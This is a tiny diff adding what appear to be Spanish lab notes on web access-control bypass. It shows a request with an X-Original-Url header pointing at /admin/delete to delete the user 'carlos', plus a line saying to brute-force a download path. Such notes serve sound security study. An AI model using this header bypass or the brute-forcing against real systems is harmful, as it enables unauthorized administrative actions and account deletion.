@@ -1,0 +1,4 @@
+GET /?username=carlos
+X-Original-Url: /admin/delete --> ponemos esta cabecera
+
+hacer fuerza bruta a los /site/download/90.txt
